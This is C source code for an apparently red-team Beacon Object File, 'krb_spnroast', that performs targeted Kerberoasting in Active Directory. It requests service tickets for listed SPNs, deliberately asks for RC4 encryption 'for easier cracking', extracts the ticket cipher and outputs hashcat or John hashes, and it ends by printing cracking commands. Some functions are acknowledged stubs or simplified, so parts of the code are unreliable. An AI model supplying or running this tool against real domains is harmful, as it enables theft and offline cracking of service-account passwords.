/*
 * krb_spnroast - Targeted SPN Roasting
 *
 * Requests service tickets for specific SPNs from a list,
 * supporting various hash output formats for cracking.
 *
 * Usage: krb_spnroast /spns:SPN1,SPN2,SPN3 [/format:hashcat|john]
 *                     [/domain:DOMAIN] [/dc:DC] [/outfile:FILE]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Output formats */
#define FORMAT_HASHCAT 0
#define FORMAT_JOHN    1

/* Build TGS-REQ for a specific SPN */
static void build_tgsreq_for_spn(KRB_BUFFER* out, const char* domain,
                                  const char* spn, const BYTE* tgt, size_t tgtLen) {
    KRB_BUFFER tgsreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&tgsreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 2048);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&tgsreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_TGS_REQ);
    asn1_context_wrap(&tgsreq, 2, &msg_type);

    /* PA-DATA with TGT */
    {
        KRB_BUFFER pa_tgs, pa_type, pa_value;
        buf_init(&pa_tgs, 2048);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 2048);

        asn1_encode_integer(&pa_type, PADATA_TGS_REQ);
        asn1_context_wrap(&pa_tgs, 1, &pa_type);

        asn1_encode_octet_string(&pa_value, tgt, tgtLen);
        asn1_context_wrap(&pa_tgs, 2, &pa_value);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_tgs);
        buf_append(&padata, tmp.data, tmp.length);

        buf_free(&pa_tgs);
        buf_free(&pa_type);
        buf_free(&pa_value);
    }
    buf_reset(&tmp);

    asn1_wrap(&tmp, ASN1_SEQUENCE, &padata);
    asn1_context_wrap(&tgsreq, 3, &tmp);
    buf_reset(&tmp);

    /* Request body */
    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal (target SPN) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        char svc_name[128], svc_host[256];
        char* slash = strchr(spn, '/');

        buf_init(&name_type, 16);
        buf_init(&name_string, 512);
        buf_init(&name_seq, 512);

        if (slash) {
            size_t svc_len = slash - spn;
            strncpy(svc_name, spn, svc_len);
            svc_name[svc_len] = '\0';
            strcpy(svc_host, slash + 1);
        } else {
            strcpy(svc_name, spn);
            svc_host[0] = '\0';
        }

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, svc_name);
        if (svc_host[0]) {
            KRB_BUFFER host_str;
            buf_init(&host_str, 256);
            asn1_encode_general_string(&host_str, svc_host);
            buf_append(&tmp, host_str.data, host_str.length);
            buf_free(&host_str);
        }
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Request RC4 encryption for easier cracking */
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&tgsreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_TGS_REQ), &tgsreq);

    buf_free(&tgsreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}

/* Extract cipher from TGS-REP for hash output */
static int extract_tgs_cipher(const BYTE* data, size_t len, BYTE** cipher,
                               size_t* cipherLen, int* etype) {
    /* Look for encrypted part in TGS-REP */
    /* Structure: TGS-REP -> enc-part -> etype, cipher */

    for (size_t i = 0; i < len - 10; i++) {
        /* Look for etype followed by cipher */
        if (data[i] == 0xA0 && data[i+2] == ASN1_INTEGER) {
            /* Found etype context tag */
            size_t offset = i + 3;
            size_t intLen = data[offset++];
            if (intLen == 1) {
                *etype = data[offset];

                /* Look for cipher (context tag [2]) */
                for (size_t j = offset; j < len - 5; j++) {
                    if (data[j] == 0xA2) {
                        size_t cOffset = j + 1;
                        size_t cLen = asn1_decode_length(data, &cOffset);

                        if (data[cOffset] == ASN1_OCTETSTRING) {
                            cOffset++;
                            *cipherLen = asn1_decode_length(data, &cOffset);
                            if (*cipherLen > 0 && *cipherLen < len - cOffset) {
                                *cipher = (BYTE*)malloc(*cipherLen);
                                if (*cipher) {
                                    memcpy(*cipher, data + cOffset, *cipherLen);
                                    return 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    return 0;
}

/* Format hash for output */
static void format_hash(const char* spn, int etype, const BYTE* cipher,
                        size_t cipherLen, int format, formatp* output) {
    if (format == FORMAT_HASHCAT) {
        /* Hashcat format: $krb5tgs$etype$*user$realm$spn*$checksum$edata */
        /* Simplified - actual format requires more parsing */
        BeaconFormatPrintf(output, "$krb5tgs$%d$*user$DOMAIN$%s*$", etype, spn);
        for (size_t i = 0; i < 16 && i < cipherLen; i++) {
            BeaconFormatPrintf(output, "%02x", cipher[i]);
        }
        BeaconFormatPrintf(output, "$");
        for (size_t i = 16; i < cipherLen; i++) {
            BeaconFormatPrintf(output, "%02x", cipher[i]);
        }
        BeaconFormatPrintf(output, "\n");
    } else {
        /* John format */
        BeaconFormatPrintf(output, "$krb5tgs$%s:", spn);
        for (size_t i = 0; i < cipherLen; i++) {
            BeaconFormatPrintf(output, "%02X", cipher[i]);
        }
        BeaconFormatPrintf(output, "\n");
    }
}

/* Request ticket for a single SPN */
static int roast_spn(const char* dc, const char* domain, const char* spn,
                      int format, formatp* output) {
    WSADATA wsaData;
    SOCKET sock;
    int result = 0;

    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 0;
    }

    sock = connect_to_kdc(dc, KRB5_PORT);
    if (sock == INVALID_SOCKET) {
        BeaconFormatPrintf(output, "[-] Failed to connect to KDC for %s\n", spn);
        WS2_32$WSACleanup();
        return 0;
    }

    /* For actual implementation, we need a TGT first */
    /* This is a simplified version that would need the TGT */
    BeaconFormatPrintf(output, "[*] Would request ticket for: %s\n", spn);

    /* In practice, use SSPI/InitializeSecurityContext for this */
    /* Or use existing TGT from cache */

    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    return result;
}

/* Use SSPI to request service ticket */
static int roast_spn_sspi(const char* spn, int format, formatp* output) {
    SECURITY_STATUS status;
    CredHandle credHandle;
    CtxtHandle ctxHandle;
    SecBufferDesc outBuffDesc;
    SecBuffer outBuff;
    TimeStamp expiry;
    ULONG ctxAttr;
    int result = 0;

    /* Acquire credentials */
    status = SECUR32$AcquireCredentialsHandleA(
        NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
        NULL, NULL, NULL, NULL, &credHandle, &expiry);

    if (status != SEC_E_OK) {
        BeaconFormatPrintf(output, "[-] AcquireCredentialsHandle failed: 0x%08X\n", status);
        return 0;
    }

    /* Initialize security context to get ticket */
    outBuff.cbBuffer = 0;
    outBuff.BufferType = SECBUFFER_TOKEN;
    outBuff.pvBuffer = NULL;

    outBuffDesc.ulVersion = SECBUFFER_VERSION;
    outBuffDesc.cBuffers = 1;
    outBuffDesc.pBuffers = &outBuff;

    status = SECUR32$InitializeSecurityContextA(
        &credHandle, NULL, (SEC_CHAR*)spn,
        ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
        0, SECURITY_NATIVE_DREP,
        NULL, 0, &ctxHandle, &outBuffDesc, &ctxAttr, &expiry);

    if (status == SEC_E_OK || status == SEC_I_CONTINUE_NEEDED) {
        if (outBuff.cbBuffer > 0 && outBuff.pvBuffer) {
            BYTE* ticket = (BYTE*)outBuff.pvBuffer;
            size_t ticketLen = outBuff.cbBuffer;

            BeaconFormatPrintf(output, "[+] Got ticket for %s (%d bytes)\n", spn, (int)ticketLen);

            /* Extract cipher from ticket */
            BYTE* cipher = NULL;
            size_t cipherLen = 0;
            int etype = 0;

            if (extract_tgs_cipher(ticket, ticketLen, &cipher, &cipherLen, &etype)) {
                BeaconFormatPrintf(output, "    Encryption: %s (%d)\n",
                    etype_string(etype), etype);
                BeaconFormatPrintf(output, "    Cipher length: %d bytes\n", (int)cipherLen);

                /* Output hash */
                format_hash(spn, etype, cipher, cipherLen, format, output);
                free(cipher);
                result = 1;
            } else {
                /* Output raw ticket in hex for manual extraction */
                BeaconFormatPrintf(output, "    Raw ticket (first 64 bytes): ");
                for (size_t i = 0; i < 64 && i < ticketLen; i++) {
                    BeaconFormatPrintf(output, "%02X", ticket[i]);
                }
                BeaconFormatPrintf(output, "...\n");
                result = 1;
            }

            SECUR32$FreeContextBuffer(outBuff.pvBuffer);
        }
        SECUR32$DeleteSecurityContext(&ctxHandle);
    } else {
        BeaconFormatPrintf(output, "[-] InitializeSecurityContext failed for %s: 0x%08X\n", spn, status);
    }

    SECUR32$FreeCredentialsHandle(&credHandle);
    return result;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* spns = NULL;
    char* format_str = NULL;
    char* domain = NULL;
    char* dc = NULL;
    int format = FORMAT_HASHCAT;
    int roasted = 0;
    int total = 0;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Targeted SPN Roasting\n\n");


    spns = arg_get(&parser, "spns");
    format_str = arg_get(&parser, "format");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");

    if (!spns) {
        BeaconFormatPrintf(&output, "[-] Error: /spns:SPN1,SPN2 required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_spnroast /spns:MSSQLSvc/db.domain.local,HTTP/web.domain.local\n");
        BeaconFormatPrintf(&output, "                   [/format:hashcat|john] [/domain:DOMAIN] [/dc:DC]\n\n");
        BeaconFormatPrintf(&output, "Formats:\n");
        BeaconFormatPrintf(&output, "  hashcat - Hashcat mode 13100 format (default)\n");
        BeaconFormatPrintf(&output, "  john    - John the Ripper format\n");
        goto cleanup;
    }

    if (format_str) {
        if (strcmp(format_str, "john") == 0 || strcmp(format_str, "John") == 0) {
            format = FORMAT_JOHN;
        }
    }

    if (!domain) {
        domain = get_domain_from_env();
    }

    BeaconFormatPrintf(&output, "[*] Output format: %s\n", format == FORMAT_HASHCAT ? "Hashcat" : "John");
    if (domain) {
        BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    }
    BeaconFormatPrintf(&output, "\n");

    /* Parse and process SPNs */
    char* spn_list = (char*)malloc(strlen(spns) + 1);
    strcpy(spn_list, spns);

    char* token = spn_list;
    char* next;
    while (token && *token) {
        next = strchr(token, ',');
        if (next) *next++ = '\0';

        /* Trim whitespace */
        while (*token == ' ') token++;
        char* end = token + strlen(token) - 1;
        while (end > token && *end == ' ') *end-- = '\0';

        if (*token) {
            total++;
            BeaconFormatPrintf(&output, "[%d] Roasting: %s\n", total, token);

            if (roast_spn_sspi(token, format, &output)) {
                roasted++;
            }

            BeaconFormatPrintf(&output, "\n");
        }

        token = next;
    }

    free(spn_list);

    BeaconFormatPrintf(&output, "========================================\n");
    BeaconFormatPrintf(&output, "[*] Roasting complete: %d/%d SPNs successful\n", roasted, total);

    if (roasted > 0) {
        BeaconFormatPrintf(&output, "\n[*] Crack hashes with:\n");
        if (format == FORMAT_HASHCAT) {
            BeaconFormatPrintf(&output, "    hashcat -m 13100 hashes.txt wordlist.txt\n");
        } else {
            BeaconFormatPrintf(&output, "    john --format=krb5tgs hashes.txt --wordlist=wordlist.txt\n");
        }
    }

cleanup:
    if (spns) free(spns);
    if (format_str) free(format_str);
    if (domain) free(domain);
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
